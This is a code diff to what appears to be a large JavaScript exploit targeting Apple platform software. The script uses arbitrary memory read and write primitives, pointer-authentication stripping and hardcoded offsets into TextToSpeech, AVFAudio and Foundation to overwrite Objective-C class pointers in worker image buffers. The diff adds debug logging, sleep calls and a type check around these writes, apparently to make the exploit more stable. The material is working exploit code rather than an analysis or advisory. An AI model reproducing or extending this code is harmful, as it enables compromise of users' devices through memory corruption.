@@ -100,6 +100,9 @@ BigInt.prototype.asInt32s = function() {
 function offsetHex(offset) {
     return '0x' + offset.toString(16);
 }
+function valueHex(value) {
+    return typeof value === 'bigint' ? value.hex() : String(value);
+}
 function stripPointerForRead(value, label, log) {
     const stripped = value.noPAC();
     if (stripped !== value)
@@ -18636,18 +18639,26 @@ async function main() {
       });
       print(`loadObjcClass: helper close done index=${index}`);
     }
-    print(`loadObjcClass: begin cls=${cls.hex()}`);
+    print(`loadObjcClass: begin cls=${valueHex(cls)}`);
+    sleep(10);
+    if (typeof cls !== 'bigint')
+      throw new Error(`loadObjcClass: invalid cls=${String(cls)}`);
     const helperIndex = p.class_load_worker_next || 0;
     const helper = p.class_load_workers && p.class_load_workers[helperIndex];
     if (helper) {
       print(`loadObjcClass: using helper worker index=${helperIndex} id=${helper.id.hex()}`);
+      sleep(10);
       const wrappedBitmap = p.read64(helper.bitmap + 0x18n);
       print(`loadObjcClass: helper wrappedBitmap=${wrappedBitmap.hex()}`);
+      sleep(10);
       const imagebuffer = p.read64(wrappedBitmap + 0x10n);
       print(`loadObjcClass: helper imagebuffer=${imagebuffer.hex()}`);
+      sleep(10);
       print("loadObjcClass: helper class write begin");
+      sleep(10);
       p.write64(imagebuffer + 0x20n, cls);
       print("loadObjcClass: helper class write done");
+      sleep(10);
       dumpClassCandidate("selected", cls);
       dumpClassCandidate("plus0x80", cls + 0x80n);
       dumpClassCandidate("minus0x80", cls - 0x80n);
@@ -18819,14 +18830,24 @@ async function main() {
           const classes = [offsets.TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit, offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker];
           for (let i = 0; i < 2; ++i) {
             const worker = dlopen_workers[i];
+            print(`preload class[${i}]=${valueHex(classes[i])} worker=${worker.id.hex()}`);
+            sleep(10);
             const wrappedBitmap = p.read64(worker.bitmap + 0x18n);
             print(`wrappedBitmap: ${wrappedBitmap.hex()}`);
+            sleep(10);
             const imageBuffer = p.read64(wrappedBitmap + 0x10n);
             print(`imageBuffer: ${imageBuffer.hex()}`);
+            sleep(10);
+            print(`preload class write begin i=${i}`);
+            sleep(10);
             p.write64(imageBuffer + 0x20n, classes[i]);
+            print(`preload class write done i=${i}`);
+            sleep(10);
           }
-          print('Load TextToSpeech');
-          await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest);
+          const providerRequestClass = offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest;
+          print(`Load TextToSpeech target=${valueHex(providerRequestClass)}`);
+          sleep(10);
+          await loadObjcClass(providerRequestClass);
           print('TextToSpeech Loaded');
           const NSBundleTables = p.read64(offsets.Foundation__NSBundleTables_bundleTables_value);
           print(`NSBundleTables: ${NSBundleTables.hex()}`);
